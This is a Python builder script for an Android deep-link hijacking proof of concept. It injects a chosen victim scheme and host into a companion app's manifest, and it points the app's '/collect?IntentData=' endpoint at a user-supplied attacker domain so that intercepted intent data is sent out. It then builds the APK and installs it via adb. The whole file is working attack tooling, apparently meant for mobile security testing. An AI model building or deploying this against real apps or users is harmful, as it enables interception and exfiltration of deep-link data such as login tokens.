#!/usr/bin/env python3

import argparse
import urllib.parse
import platform
import os
import subprocess
import shutil
from pathlib import Path
from lxml import etree
import re

PROJECT_DIR = Path("DeepLinkHijackingPoCApp")
ANDROID_MANIFEST_PATH = PROJECT_DIR / "app/src/main/AndroidManifest.xml"
APK_LOCATION = PROJECT_DIR / "app/build/outputs/apk/release/DeepLinkHijackingPoCApp-release.apk"
JAVA_ACTIVITY_PATH = PROJECT_DIR / "app/src/main/java/com/example/deeplinkhijackingpoc/DeepLinkHijackActivity.java"
COLLECT_PATTERN = re.compile(
    r"https://[^/]+(/collect\?IntentData=)"
)


# -------------------------
# Utils
# -------------------------

def run_command(command: list[str], cwd: Path | None = None) -> None:
    """Run command and print output on failure."""
    try:
        result = subprocess.run(
            command,
            cwd=cwd,
            check=True,
            text=True
        )
    except subprocess.CalledProcessError as e:
        print("\n❌ Command failed:", " ".join(command))
        print("Return code:", e.returncode)
        raise


# -------------------------
# Deep Link Injection
# -------------------------

def insert_deep_link(manifest_file: Path, deep_link: str) -> None:
    if not manifest_file.exists():
        raise FileNotFoundError(f"Manifest not found: {manifest_file}")

    parsed = urllib.parse.urlparse(deep_link)

    if not parsed.scheme:
        raise ValueError("Deep link must include a scheme (example: myapp://host/path)")

    parser = etree.XMLParser(remove_blank_text=True)
    tree = etree.parse(str(manifest_file), parser)
    root = tree.getroot()

    nsmap = root.nsmap.copy()
    if None in nsmap:
        nsmap["default"] = nsmap.pop(None)

    android_ns = nsmap.get("android")
    if not android_ns:
        raise RuntimeError("Android namespace not found in manifest")

    android = f"{{{android_ns}}}"

    # safer xpath — find ANY matching data tag
    matches = root.xpath(
        ".//intent-filter/data[@android:scheme and @android:host]",
        namespaces=nsmap
    )

    if not matches:
        raise RuntimeError("No <data android:scheme android:host> tag found in manifest")

    data_tag = matches[0]

    data_tag.attrib[android + "scheme"] = parsed.scheme
    data_tag.attrib[android + "host"] = parsed.netloc or "*"

    # backup before overwrite
    shutil.copy(manifest_file, manifest_file.with_suffix(".xml.bak"))

    tree.write(
        str(manifest_file),
        pretty_print=True,
        xml_declaration=True,
        encoding="utf-8"
    )

    print(f"✅ Injected deep link: {parsed.scheme}://{parsed.netloc or '*'}")

# -------------------------
# URL Domain Replacement
# -------------------------

def replace_collect_domain(java_file: Path, new_domain: str) -> None:
    if not java_file.exists():
        raise FileNotFoundError(f"Java file not found: {java_file}")

    content = java_file.read_text(encoding="utf-8")

    matches = COLLECT_PATTERN.findall(content)
    if not matches:
        print("⚠️ No collect URL pattern found — nothing replaced")
        return

    # normalize input (strip scheme if user passed it)
    new_domain = new_domain.replace("https://", "").replace("http://", "").strip("/")

    # backup first
    shutil.copy(java_file, java_file.with_suffix(".java.bak"))

    def repl(match: re.Match) -> str:
        return f"https://{new_domain}{match.group(1)}"

    updated = COLLECT_PATTERN.sub(repl, content)

    java_file.write_text(updated, encoding="utf-8")

    print(f"✅ Replaced collect endpoint domain → {new_domain}")


# -------------------------
# Build APK
# -------------------------

def build_apk() -> None:
    system = platform.system()

    if system == "Windows":
        gradle = "gradlew.bat"
        cmd = [gradle, "assembleRelease"]
    else:
        gradle = "gradlew"
        cmd = [f"./{gradle}", "assembleRelease"]

    gradle_file = PROJECT_DIR / gradle

    if not gradle_file.exists():
        raise FileNotFoundError(f"Missing {gradle_file}")

    if system != "Windows":
        gradle_file.chmod(gradle_file.stat().st_mode | 0o111)

    run_command(cmd, cwd=PROJECT_DIR)



# -------------------------
# Main
# -------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Deep Link Hijacking PoC Builder"
    )

    parser.add_argument(
        "-l", "--link",
        required=True,
        help="Deep link to hijack (example: myapp://host)"
    )

    parser.add_argument(
        "-u", "--url",
        help="Define an attacker domain to extract the intent's data"
    )

    parser.add_argument(
        "-o", "--output",
        help="Copy built APK to this path"
    )

    parser.add_argument(
        "-i", "--install",
        action="store_true",
        help="Install APK using adb"
    )

    args = parser.parse_args()

    insert_deep_link(ANDROID_MANIFEST_PATH, args.link)
    if args.url:
    	replace_collect_domain(JAVA_ACTIVITY_PATH, args.url)
    build_apk()

    if not APK_LOCATION.exists():
        raise FileNotFoundError("APK not produced — build likely failed")

    if args.output:
        shutil.copy(APK_LOCATION, args.output)
        print(f"📦 Copied APK → {args.output}")

    if args.install:
        run_command(["adb", "install", str(APK_LOCATION)])
        print("📲 APK installed")


if __name__ == "__main__":
    main()
